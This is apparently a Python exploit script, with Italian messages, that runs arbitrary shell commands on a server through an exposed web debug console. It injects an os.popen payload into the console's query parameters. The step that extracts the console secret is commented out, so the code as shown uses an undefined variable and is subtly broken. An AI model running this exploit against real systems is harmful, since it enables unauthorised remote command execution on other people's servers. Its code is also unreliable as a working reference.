#!/usr/bin/python3

import requests
import sys
import re

if len(sys.argv) != 3:
    print("USAGE: python3 %s url command" % (sys.argv[0]))
    sys.exit(-1)

response = requests.get('http://%s/console' % (sys.argv[1]))

if response.status_code != 200:
    print("[-] Debug non e' abilitato")
    sys.exit(1)
    

cmd = '''__import__('os').popen(\'%s\').read();''' % (sys.argv[2])
"""
response = requests.get('http://%s/console' % (sys.argv[1]))
secret = re.findall("[0-9a-zA-Z]{20}",response.text)
if len(secret) != 1:
    print("[-] Nessuna Flag")
    sys.exit(-1)
else:
    secret = secret[0]
    print("[+] SECRET e': "+str(secret))
"""
print("[+] Esecuzione  %s on %s" % (sys.argv[2],sys.argv[1]))

response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (sys.argv[1],str(cmd),secret))

print("[+] Risposta dal server")
print("status code: " + str(response.status_code))
print("response: "+ str(response.text))
